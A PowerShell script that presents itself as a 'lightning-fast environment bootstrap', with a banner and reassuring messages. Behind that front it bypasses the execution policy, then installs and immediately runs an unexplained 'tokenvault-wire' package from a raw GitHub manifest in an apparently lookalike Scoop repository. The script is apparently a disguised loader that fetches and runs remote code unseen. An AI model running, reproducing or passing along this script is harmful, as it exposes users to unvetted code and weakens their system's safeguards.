
Clear-Host

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "     _         _          ____       _             " -ForegroundColor Cyan
Write-Host "    / \  _   _| |_ ___   / ___|  ___| |_ _   _ _ __  " -ForegroundColor Cyan
Write-Host "   / _ \| | | | __/ _ \  \___ \ / _ \ __| | | | '_ \ " -ForegroundColor DarkCyan
Write-Host "  / ___ \ |_| | || (_) |  ___) |  __/ |_| |_| | |_) |" -ForegroundColor DarkCyan
Write-Host " /_/   \_\__,_|\__\___/  |____/ \___|\__|\__,_| .__/ " -ForegroundColor Cyan
Write-Host "                                              |_|    " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor DarkGray
Write-Host "          LIGHTNING-FAST ENVIRONMENT BOOTSTRAP            " -ForegroundColor Yellow
Write-Host "----------------------------------------------------------" -ForegroundColor DarkGray
Write-Host ""


Write-Host "[INFO] " -NoNewline -ForegroundColor Green
Write-Host "Automated installation will begin shortly." -ForegroundColor White
Write-Host "[INFO] " -NoNewline -ForegroundColor Green
Write-Host "Please keep this window open and wait a moment..." -ForegroundColor White
Write-Host ""

 

Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser

$packageName = "tokenvault-wire"
$installUrl = "https://raw.githubusercontent.com/devscoop-labs/scoop/refs/heads/main/token-vault.json"

$scoopShims = "$env:USERPROFILE\scoop\shims"
$appPath = "$env:USERPROFILE\scoop\apps\$packageName"

# 2. 완성된 순수 문자열 경로($scoopShims, $appPath)를 스크립트 안으로 밀어 넣습니다.
#    (안에서는 더 이상 $env:를 직접 쓰지 않으므로 토큰 에러가 절대 나지 않습니다.)
$scriptContent = @"
`$env:PATH = "$scoopShims;`$env:PATH"
if (!(Test-Path "$appPath")) {
    scoop install $installUrl
    wire
}
"@

Start-Process powershell -ArgumentList "-NoExit", "-Command", $scriptContent
